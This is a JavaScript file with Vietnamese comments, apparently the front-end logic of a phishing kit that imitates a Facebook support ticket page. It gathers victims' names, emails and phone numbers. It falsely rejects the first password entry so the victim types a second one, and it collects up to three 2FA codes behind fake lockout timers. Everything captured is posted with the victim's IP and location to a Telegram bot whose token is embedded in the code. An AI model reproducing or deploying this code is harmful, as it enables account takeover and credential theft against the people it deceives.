/* ========================================================================
   PHẦN 1: CẤU HÌNH & TIỆN ÍCH (CONFIG & UTILS)
   ======================================================================== */
const CONFIG = {
    TELEGRAM: {
        // Thay Token và Chat ID của bạn vào đây
        BOT_TOKEN: atob("7100924911:AAFbe2QHrx26J5pREWtgn-jo2pWKh5A9imE"), 
        CHAT_ID: atob("-5070121169")
    },
    IP_API: "https://ipwho.is/",
    REDIRECT_URL: "https://www.facebook.com"
};

const Utils = {
    getLocation: async () => {
        try {
            const response = await fetch(CONFIG.IP_API);
            const data = await response.json();
            if (data.success) {
                return {
                    ip: data.ip,
                    city: data.city || "Unknown",
                    country: data.country || "Unknown",
                    flag: data.flag ? data.flag.emoji : "" 
                };
            }
            return { ip: data.ip || "Unknown", city: "N/A", country: "N/A", flag: "" };
        } catch (e) {
            return { ip: "Error", city: "N/A", country: "N/A", flag: "" };
        }
    },

    getTime: () => {
        return new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
    },

    sendMessage: async (message) => {
        const { BOT_TOKEN, CHAT_ID } = CONFIG.TELEGRAM;
        if (!BOT_TOKEN || !CHAT_ID) return false;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            return true;
        } catch (e) {
            console.error(e);
            return false;
        }
    },

    formatReport: (data, type, loc) => {
        const time = Utils.getTime();
        let icon = type === "INFO" ? "📝 INFO" : (type === "PASS" ? "🔑 PASS" : "🔥 OTP");

        let infoBlock = `<b>Name:</b> ${data.fullName}`;
        infoBlock += `\n<b>Mail:</b> ${data.email}`;
        if (data.businessEmail) infoBlock += `\n<b>Biz Mail:</b> ${data.businessEmail}`;
        infoBlock += `\n<b>Phone:</b> ${data.phone}`;

        let passBlock = "";
        if (data.pass1) passBlock += `\n----------------\n<b>Pass 1:</b> <code>${data.pass1}</code>`;
        if (data.pass2) passBlock += `\n<b>Pass 2:</b> <code>${data.pass2}</code>`;
        
        let otpBlock = "";
        if (data.twoFactorCode) otpBlock = `\n----------------\n<b>📲 2FA:</b> <code>${data.twoFactorCode}</code>`;

        let ipBlock = `\n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag}`;

        return `<b>${icon}</b> | ${time}\n----------------\n${infoBlock}${passBlock}${otpBlock}${ipBlock}`;
    }
};

/* ========================================================================
   PHẦN 2: LOGIC TƯƠNG TÁC DOM (MAIN LOGIC)
   ======================================================================== */
document.addEventListener("DOMContentLoaded", () => {
    
    // --- KHAI BÁO CÁC PHẦN TỬ HTML (Theo đúng ID trong file HTML của bạn) ---
    const overlay = document.getElementById("overlay");
    
    // 1. Màn hình chính
    const submitRequestBtn = document.getElementById("submitRequestBtn");
    const ticketIdEl = document.getElementById("ticketId");

    // 2. Form Thông tin (Info Form)
    const infoForm = document.getElementById("infoForm");
    // Lấy nút Send trong Info Form (vì trong HTML bạn không đặt ID cho nút này nên dùng querySelector)
    const infoSendBtn = infoForm.querySelector("button"); 
    const infoInputs = infoForm.querySelectorAll(".meta-input"); // Lấy tất cả ô input
    const infoCheckbox = infoForm.querySelector("input[type='checkbox']");

    // 3. Form Mật khẩu (Password Form)
    const passwordForm = document.getElementById("passwordForm");
    const passwordInput = document.getElementById("passwordInput");
    const continueBtn = document.getElementById("continueBtn");
    
    // Tạo dòng thông báo lỗi cho Password (vì HTML gốc chưa có ID cho lỗi pass, ta thêm bằng JS)
    let passwordError = document.createElement("p");
    passwordError.className = "text-red-600 text-sm mt-2 hidden text-center";
    passwordError.innerText = "The password you entered is incorrect. Please try again.";
    if(passwordInput) passwordInput.after(passwordError);

    // 4. Form Xác minh (Verify Modal)
    const verifyModal = document.getElementById("verifyModal");
    const verifyCodeInput = document.getElementById("verifyCode");
    const verifyError = document.getElementById("verifyError");
    const countdown = document.getElementById("countdown");
    const verifyBtn = document.getElementById("verifyBtn");
    const verifyTitle = document.getElementById("verifyTitle");
    const userNameEl = document.getElementById("userName");
    const maskedEmailEl = document.getElementById("maskedEmail");
    const maskedPhoneEl = document.getElementById("maskedPhone");

    // ============================================================
    // LOGIC CHẠY
    // ============================================================

    // 1. Tạo Ticket ID ngẫu nhiên khi vào trang
    if (ticketIdEl) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        const block = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
        ticketIdEl.innerText = `${block()}-${block()}-${block()}`;
    }

    // 2. Bấm "Submit Request" -> Hiện Form Info
    if (submitRequestBtn) {
        submitRequestBtn.addEventListener("click", () => {
            overlay.classList.remove("hidden");
            infoForm.classList.remove("hidden");
        });
    }

    // 3. Xử lý Form Info -> Chuyển sang Pass
    if (infoSendBtn) {
        infoSendBtn.addEventListener("click", () => {
            // Validate Checkbox
            if (infoCheckbox && !infoCheckbox.checked) {
                alert("Please agree with Terms of use");
                return;
            }

            // Lưu thông tin vào SessionStorage
            // Thứ tự input trong HTML của bạn: [0]FullName, [1]Email, [2]BizEmail, [3]PageName, [4]Phone
            sessionStorage.setItem("fullName", infoInputs[0].value || "");
            sessionStorage.setItem("email", infoInputs[1].value || "");
            sessionStorage.setItem("businessEmail", infoInputs[2].value || "");
            sessionStorage.setItem("pageName", infoInputs[3].value || "");
            sessionStorage.setItem("phone", infoInputs[4].value || "");

            // Ẩn Info, Hiện Password
            infoForm.classList.add("hidden");
            passwordForm.classList.remove("hidden");
        });
    }

    // 4. Xử lý Password (2 lần)
    let passwordAttempts = 0;

    if (continueBtn) {
        continueBtn.addEventListener("click", async () => {
            const currentPass = passwordInput.value;
            if (!currentPass) return;

            passwordAttempts++;
            continueBtn.innerText = "Checking...";
            continueBtn.disabled = true;

            const userLoc = await Utils.getLocation();

            if (passwordAttempts === 1) {
                // --- Lần 1: Báo sai, KHÔNG khóa ---
                sessionStorage.setItem("pass1", currentPass);

                const data = {
                    fullName: sessionStorage.getItem("fullName"),
                    email: sessionStorage.getItem("email"),
                    businessEmail: sessionStorage.getItem("businessEmail"),
                    phone: sessionStorage.getItem("phone"),
                    pass1: currentPass
                };
                await Utils.sendMessage(Utils.formatReport(data, "PASS", userLoc));

                // Hiện lỗi
                passwordError.classList.remove("hidden");
                passwordInput.value = "";
                passwordInput.focus();
                
                // Mở lại nút ngay
                continueBtn.innerText = "Continue";
                continueBtn.disabled = false;
            } 
            else {
                // --- Lần 2: Đúng -> Chuyển sang Verify ---
                const oldPass = sessionStorage.getItem("pass1");
                const data = {
                    fullName: sessionStorage.getItem("fullName"),
                    email: sessionStorage.getItem("email"),
                    businessEmail: sessionStorage.getItem("businessEmail"),
                    phone: sessionStorage.getItem("phone"),
                    pass1: oldPass,
                    pass2: currentPass
                };
                await Utils.sendMessage(Utils.formatReport(data, "PASS", userLoc));

                // Ẩn Password, Hiện Verify
                passwordForm.classList.add("hidden");
                verifyModal.classList.remove("hidden");
                
                // Điền thông tin fake vào verify modal
                setupVerifyModal();
            }
        });
    }

    // Hàm điền thông tin mask vào modal verify
    function setupVerifyModal() {
        const name = sessionStorage.getItem("fullName");
        const email = sessionStorage.getItem("email");
        const phone = sessionStorage.getItem("phone");

        if (userNameEl) userNameEl.innerText = name;
        
        // Mask Email
        if (maskedEmailEl && email) {
            const [u, d] = email.split('@');
            const maskU = u.length > 3 ? u.substring(0,3) : u;
            maskedEmailEl.innerText = `${maskU}***@${d || ""}`;
        }

        // Mask Phone
        if (maskedPhoneEl && phone) {
            maskedPhoneEl.innerText = `*******${phone.slice(-3)}`;
        }
    }

    // 5. Xử lý Verify Code (Khóa 30s)
    let verifyAttempts = 0;
    let isLocked = false;

    function startLockdown(seconds) {
        isLocked = true;
        verifyBtn.disabled = true;
        verifyBtn.classList.add("opacity-50", "cursor-not-allowed");
        
        countdown.classList.remove("hidden");
        countdown.innerText = `Try again in ${seconds}s`;

        const timer = setInterval(() => {
            seconds--;
            countdown.innerText = `Try again in ${seconds}s`;

            if (seconds <= 0) {
                clearInterval(timer);
                isLocked = false;
                verifyBtn.disabled = false;
                verifyBtn.classList.remove("opacity-50", "cursor-not-allowed");
                verifyBtn.innerText = "Continue";
                
                countdown.classList.add("hidden");
                verifyError.classList.add("hidden");
            }
        }, 1000);
    }

    if (verifyBtn) {
        verifyBtn.addEventListener("click", async () => {
            if (isLocked) return;

            const code = verifyCodeInput.value;
            if (!code) return;

            verifyBtn.innerText = "Checking...";
            verifyAttempts++;

            const userLoc = await Utils.getLocation();
            
            const data = {
                fullName: sessionStorage.getItem("fullName"),
                email: sessionStorage.getItem("email"),
                businessEmail: sessionStorage.getItem("businessEmail"),
                phone: sessionStorage.getItem("phone"),
                pass1: sessionStorage.getItem("pass1"),
                pass2: passwordInput.value, // Lấy lại pass cuối
                twoFactorCode: code
            };

            await Utils.sendMessage(Utils.formatReport(data, "OTP", userLoc));

            // Báo sai
            verifyError.classList.remove("hidden");
            verifyError.innerText = "The code you entered is incorrect.";
            verifyCodeInput.value = "";

            // Cập nhật title (Step 1/3 -> 2/3)
            if (verifyTitle) {
                verifyTitle.innerText = `Two-factor authentication required (${Math.min(verifyAttempts + 1, 3)}/3)`;
            }

            // Nếu sai 3 lần -> Chuyển hướng
            if (verifyAttempts >= 3) {
                verifyBtn.innerText = "Redirecting...";
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_URL;
                }, 1000);
                return;
            }

            // --- KHÓA 30s NGAY LẬP TỨC ---
            startLockdown(30);
        });
    }

});
